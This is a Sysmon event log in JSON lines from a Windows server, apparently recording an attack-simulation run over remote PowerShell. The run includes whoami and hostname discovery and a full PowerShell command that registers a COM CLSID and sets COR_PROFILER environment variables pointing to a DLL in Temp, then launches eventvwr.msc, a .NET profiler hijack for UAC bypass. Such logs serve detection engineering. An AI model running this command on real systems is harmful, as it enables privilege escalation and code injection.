{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:54.5487586"},"EventRecordID":"17962","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:54.545"},{"@Name":"ProcessGuid","#text":"dbf410b3-b3d6-671f-9a00-000000003900"},{"@Name":"ProcessId","#text":"4028"},{"@Name":"Image","#text":"C:\\Windows\\System32\\svchost.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.0689369"},"EventRecordID":"17963","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.061"},{"@Name":"ProcessGuid","#text":"dbf410b3-b445-671f-c300-000000003900"},{"@Name":"ProcessId","#text":"3828"},{"@Name":"Image","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.0723122"},"EventRecordID":"17964","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.069"},{"@Name":"ProcessGuid","#text":"dbf410b3-b445-671f-c400-000000003900"},{"@Name":"ProcessId","#text":"2628"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}










{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.7338761"},"EventRecordID":"17985","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.726"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-cf00-000000003900"},{"@Name":"ProcessId","#text":"2356"},{"@Name":"Image","#text":"C:\\Windows\\System32\\HOSTNAME.EXE"},{"@Name":"FileVersion","#text":"10.0.19041.1 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Hostname APP"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"hostname.exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\HOSTNAME.EXE\""},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\Documents\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-b43c-671f-f8b2-120000000000"},{"@Name":"LogonId","#text":"0x12B2F8"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-b43d-671f-ba00-000000003900"},{"@Name":"ParentProcessId","#text":"4552"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.7355960"},"EventRecordID":"17986","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.731"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d000-000000003900"},{"@Name":"ProcessId","#text":"1480"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-b43c-671f-f8b2-120000000000"},{"@Name":"LogonId","#text":"0x12B2F8"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-b447-671f-cf00-000000003900"},{"@Name":"ParentProcessId","#text":"2356"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\HOSTNAME.EXE"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\HOSTNAME.EXE\""},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.7890482"},"EventRecordID":"17987","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.779"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-cf00-000000003900"},{"@Name":"ProcessId","#text":"2356"},{"@Name":"Image","#text":"C:\\Windows\\System32\\HOSTNAME.EXE"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.7934183"},"EventRecordID":"17988","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.779"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d000-000000003900"},{"@Name":"ProcessId","#text":"1480"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.7987994"},"EventRecordID":"17989","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.794"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d100-000000003900"},{"@Name":"ProcessId","#text":"6952"},{"@Name":"Image","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"FileVersion","#text":"10.0.19041.1 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"whoami - displays logged on user information"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"whoami.exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\whoami.exe\""},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\Documents\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-b43c-671f-f8b2-120000000000"},{"@Name":"LogonId","#text":"0x12B2F8"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-b43d-671f-ba00-000000003900"},{"@Name":"ParentProcessId","#text":"4552"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.8106512"},"EventRecordID":"17990","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.803"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d200-000000003900"},{"@Name":"ProcessId","#text":"5212"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-b43c-671f-f8b2-120000000000"},{"@Name":"LogonId","#text":"0x12B2F8"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-b447-671f-d100-000000003900"},{"@Name":"ParentProcessId","#text":"6952"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\whoami.exe\""},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.8712359"},"EventRecordID":"17991","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.868"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d100-000000003900"},{"@Name":"ProcessId","#text":"6952"},{"@Name":"Image","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.8740553"},"EventRecordID":"17992","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.872"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d200-000000003900"},{"@Name":"ProcessId","#text":"5212"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:55.9931291"},"EventRecordID":"17993","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.981"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d300-000000003900"},{"@Name":"ProcessId","#text":"6728"},{"@Name":"Image","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"FileVersion","#text":"10.0.19041.3996 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Windows PowerShell"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"PowerShell.EXE"},{"@Name":"CommandLine","#text":"\"powershell.exe\" &amp; {Write-Host \\\"\"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\\"\" -ForegroundColor Cyan, New-Item -Path \\\"\"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\\\"\" -Value \\\"\"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll\\\"\" -Force | Out-Null, New-ItemProperty -Path HKCU:\\Environment -Name \\\"\"COR_ENABLE_PROFILING\\\"\" -PropertyType String -Value \\\"\"1\\\"\" -Force | Out-Null, New-ItemProperty -Path HKCU:\\Environment -Name \\\"\"COR_PROFILER\\\"\" -PropertyType String -Value \\\"\"{09108e71-974c-4010-89cb-acf471ae9e2c}\\\"\" -Force | Out-Null, New-ItemProperty -Path HKCU:\\Environment -Name \\\"\"COR_PROFILER_PATH\\\"\" -PropertyType String -Value \\\"\"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll\\\"\" -Force | Out-Null, Write-Host \\\"\"executing eventvwr.msc\\\"\" -ForegroundColor Cyan, START MMC.EXE EVENTVWR.MSC}"},{"@Name":"CurrentDirectory","#text":"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-b43c-671f-f8b2-120000000000"},{"@Name":"LogonId","#text":"0x12B2F8"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-b43d-671f-ba00-000000003900"},{"@Name":"ParentProcessId","#text":"4552"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:56.0010607"},"EventRecordID":"17994","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:55.996"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d400-000000003900"},{"@Name":"ProcessId","#text":"468"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-b43c-671f-f8b2-120000000000"},{"@Name":"LogonId","#text":"0x12B2F8"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-b447-671f-d300-000000003900"},{"@Name":"ParentProcessId","#text":"6728"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"ParentCommandLine","#text":"\"powershell.exe\" &amp; {Write-Host \\\"\"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\\"\" -ForegroundColor Cyan, New-Item -Path \\\"\"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\\\"\" -Value \\\"\"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll\\\"\" -Force | Out-Null, New-ItemProperty -Path HKCU:\\Environment -Name \\\"\"COR_ENABLE_PROFILING\\\"\" -PropertyType String -Value \\\"\"1\\\"\" -Force | Out-Null, New-ItemProperty -Path HKCU:\\Environment -Name \\\"\"COR_PROFILER\\\"\" -PropertyType String -Value \\\"\"{09108e71-974c-4010-89cb-acf471ae9e2c}\\\"\" -Force | Out-Null, New-ItemProperty -Path HKCU:\\Environment -Name \\\"\"COR_PROFILER_PATH\\\"\" -PropertyType String -Value \\\"\"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll\\\"\" -Force | Out-Null, Write-Host \\\"\"executing eventvwr.msc\\\"\" -ForegroundColor Cyan, START MMC.EXE EVENTVWR.MSC}"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:58.9812016"},"EventRecordID":"17995","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:58.951"},{"@Name":"ProcessGuid","#text":"dbf410b3-b44a-671f-d500-000000003900"},{"@Name":"ProcessId","#text":"2888"},{"@Name":"Image","#text":"C:\\Windows\\System32\\mmc.exe"},{"@Name":"FileVersion","#text":"10.0.19041.5007 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Microsoft Management Console"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"mmc.exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\mmc.exe\" EVENTVWR.MSC "},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\AppData\\Local\\Temp\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-b43c-671f-f8b2-120000000000"},{"@Name":"LogonId","#text":"0x12B2F8"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=8FC82C08A65589B8207D4C10F0D019C7CD6870E4EC00335CD1F4BBA43069F011"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-b447-671f-d300-000000003900"},{"@Name":"ParentProcessId","#text":"6728"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"ParentCommandLine","#text":"\"powershell.exe\" &amp; {Write-Host \\\"\"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\\"\" -ForegroundColor Cyan, New-Item -Path \\\"\"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\\\"\" -Value \\\"\"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll\\\"\" -Force | Out-Null, New-ItemProperty -Path HKCU:\\Environment -Name \\\"\"COR_ENABLE_PROFILING\\\"\" -PropertyType String -Value \\\"\"1\\\"\" -Force | Out-Null, New-ItemProperty -Path HKCU:\\Environment -Name \\\"\"COR_PROFILER\\\"\" -PropertyType String -Value \\\"\"{09108e71-974c-4010-89cb-acf471ae9e2c}\\\"\" -Force | Out-Null, New-ItemProperty -Path HKCU:\\Environment -Name \\\"\"COR_PROFILER_PATH\\\"\" -PropertyType String -Value \\\"\"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll\\\"\" -Force | Out-Null, Write-Host \\\"\"executing eventvwr.msc\\\"\" -ForegroundColor Cyan, START MMC.EXE EVENTVWR.MSC}"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:59.0315397"},"EventRecordID":"17996","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:59.030"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d300-000000003900"},{"@Name":"ProcessId","#text":"6728"},{"@Name":"Image","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:59.0421305"},"EventRecordID":"17997","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:56:59.030"},{"@Name":"ProcessGuid","#text":"dbf410b3-b447-671f-d400-000000003900"},{"@Name":"ProcessId","#text":"468"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:57:01.0461675"},"EventRecordID":"17998","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:57:01.017"},{"@Name":"ProcessGuid","#text":"dbf410b3-b44d-671f-d600-000000003900"},{"@Name":"ProcessId","#text":"6244"},{"@Name":"Image","#text":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"},{"@Name":"FileVersion","#text":"1.3.147.37"},{"@Name":"Description","#text":"Microsoft Edge Update"},{"@Name":"Product","#text":"Microsoft Edge Update"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"msedgeupdate.dll"},{"@Name":"CommandLine","#text":"\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /ua /installsource scheduler"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-c1ce-671f-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=3096D8E82917A9B73F322F4B1743E52E9B0C8B3C5933A957E73E29D6973CDD5B"},{"@Name":"ParentProcessGuid","#text":"00000000-0000-0000-0000-000000000000"},{"@Name":"ParentProcessId","#text":"1168"},{"@Name":"ParentImage","#text":"-"},{"@Name":"ParentCommandLine","#text":"-"},{"@Name":"ParentUser","#text":"-"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:57:04.5573959"},"EventRecordID":"17999","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:57:04.553"},{"@Name":"ProcessGuid","#text":"dbf410b3-b44d-671f-d600-000000003900"},{"@Name":"ProcessId","#text":"6244"},{"@Name":"Image","#text":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
